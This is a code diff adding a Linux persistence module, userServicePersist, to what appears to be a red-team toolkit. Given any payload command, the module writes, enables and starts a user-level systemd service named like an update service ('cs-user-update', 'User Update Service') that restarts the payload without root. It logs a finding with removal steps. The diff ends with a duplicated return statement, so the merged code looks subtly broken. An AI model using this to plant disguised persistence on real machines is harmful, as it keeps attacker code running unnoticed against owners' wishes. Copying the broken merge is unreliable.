@@ -977,6 +977,61 @@ fi
   }
 
   return { output: output.join("\n"), findings }
+}
+
+export async function userServicePersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== User-level Systemd Service Persistence ==="]
+  const payload = argVal(args, "--payload")
+  const name = argVal(args, "--name") || "cs-user-update"
+
+  const script = `
+echo "--- User Systemd Directory ---"
+ls -la ~/.config/systemd/user/ 2>/dev/null || echo "[-] No user systemd directory yet"
+echo ""
+echo "--- User Services ---"
+systemctl --user list-units --type=service --no-pager 2>/dev/null | head -15 || echo "[-] systemctl --user not available"
+echo ""
+${payload ? `
+echo "--- Installing User Service ---"
+mkdir -p ~/.config/systemd/user 2>/dev/null
+cat > ~/.config/systemd/user/${name}.service << 'USRSVC'
+[Unit]
+Description=User Update Service
+
+[Service]
+Type=simple
+ExecStart=${payload}
+Restart=on-failure
+RestartSec=30
+
+[Install]
+WantedBy=default.target
+USRSVC
+systemctl --user daemon-reload 2>/dev/null
+systemctl --user enable ${name}.service 2>/dev/null && echo "[+] User service enabled: ${name}" || echo "[-] Failed to enable"
+systemctl --user start ${name}.service 2>/dev/null && echo "[+] User service started" || echo "[-] Failed to start"
+` : `echo "[*] Dry run — pass --payload <cmd> --name <svc> to install. No root needed."
+`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] User service enabled")) {
+    findings.push({
+      checkId: "LNX-USERSVC-001",
+      provider: "linuxhook",
+      severity: "MEDIUM",
+      status: "INSTALLED",
+      resource: `~/.config/systemd/user/${name}.service`,
+      title: "User-level systemd service persistence installed",
+      details: `User service ${name}.service created — persists without root, runs as current user`,
+      remediation: `Remove with: systemctl --user disable --now ${name}.service && rm ~/.config/systemd/user/${name}.service`,
+    })
+  }
+
+  return { output: output.join("\n"), findings }
 
   return { output: output.join("\n"), findings }
 
